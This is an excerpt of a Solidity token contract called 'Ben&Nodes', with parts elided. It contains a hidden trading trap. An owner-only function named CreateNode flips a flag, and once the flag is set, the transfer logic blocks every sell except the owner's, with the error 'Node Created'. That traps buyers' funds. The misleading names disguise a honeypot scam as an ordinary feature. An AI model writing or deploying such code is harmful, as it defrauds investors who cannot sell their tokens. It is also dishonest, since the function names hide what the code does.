...
contract BenNodes is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd; 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Ben&Nodes";
    ...
    address public autoLiquidityReceiver=0x8AA1c15f9624b365793c555E61dE8E8Df7e4ccB8;
    address public marketingFeeReceiver=0x8AA1c15f9624b365793c555E61dE8E8Df7e4ccB8;
    ...
    function CreateNode(bool value) external onlyOwner {
        Node = value;
    }
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!Node || sender==owner), "Node Created");
